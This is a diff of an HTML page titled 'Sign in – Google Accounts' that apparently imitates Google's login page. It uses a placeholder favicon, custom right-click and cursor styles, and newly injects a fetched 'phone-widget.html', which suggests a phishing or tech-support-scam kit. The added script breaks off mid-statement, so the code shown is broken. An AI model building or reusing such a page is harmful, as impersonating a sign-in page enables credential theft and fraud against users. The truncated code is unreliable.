@@ -3,12 +3,12 @@
 <head>
     <link rel="stylesheet" href="rightclick.css">
     <link rel="stylesheet" href="custom-cursor.css">
-    <link rel="stylesheet" href__="rightclick.css">
-    <link rel="stylesheet" href__="custom-cursor.css">
+    <link rel="stylesheet" href="rightclick.css">
+    <link rel="stylesheet" href="custom-cursor.css">
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width,initial-scale=1" />
     <title>Sign in – Google Accounts</title>
-    <link rel="icon" type="image/png" href__="https://placehold.co/16x16/0a8c2d/ffffff?text=G" />
+    <link rel="icon" type="image/png" href="https://placehold.co/16x16/0a8c2d/ffffff?text=G" />
     <style>
         :root {
             --bg-color: #f1f1f1;
@@ -983,5 +983,15 @@
 
 
 <script type="module" src="online.js"></script>
+
+<div id="tac-phone-container"></div>
+<script>
+    fetch('phone-widget.html')
+        .then(r => r.text())
+        .then(html => {
+            const container = document.getElementById('tac-phone-container');
+            const parser = new DOMParser();
+            const doc = parser.parseFromString(html, 'text/html');
+
 </body>
 </html>
